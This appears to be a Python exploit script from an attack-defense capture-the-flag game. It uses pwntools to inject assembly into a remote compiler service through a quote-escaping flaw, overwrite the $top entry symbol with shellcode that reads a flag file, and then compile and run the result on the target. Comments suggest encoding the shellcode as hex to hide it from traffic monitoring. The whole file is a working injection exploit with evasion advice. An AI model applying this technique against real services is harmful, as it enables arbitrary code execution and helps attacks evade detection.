import pwn
import utils

# Inject into assembly, using \\" - grammar is wrong there
# expects 'main=.' to be used as labels instead of 'main:'

# Create a string with the two blackslashes and 
# the double quote to escape in to assembly.
# Then overwrite the $top entry global symbol.
# Put the flag shellcode behind it.
# And prevent assembler error on the closing double quote with a #.
# The shellcode here is super obvious in the traffic.
# In the real exploit you probably want to hide it using hex numbers. 
exploit_code = """
'BEGIN'
  outstring("\\\\"
  .text
  $top:
  %s
  #")
'END'
"""

def main(host, flag_id):
    # patch shellcraft to not use constants like SYS_open
    def no_pretty(n, comment=True):
        if isinstance(n, (str, bytes, list, tuple, dict)):
            return repr(n)
        return hex(n)
    pwn.shellcraft.pretty = no_pretty

    shellcode = pwn.shellcraft.cat2(flag_id) + pwn.shellcraft.exit(0)

    # add shellcode to exploit
    code = exploit_code % (shellcode)
    json, elf = utils.compileCode(host, code)

    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)


utils.launchExploit(main)
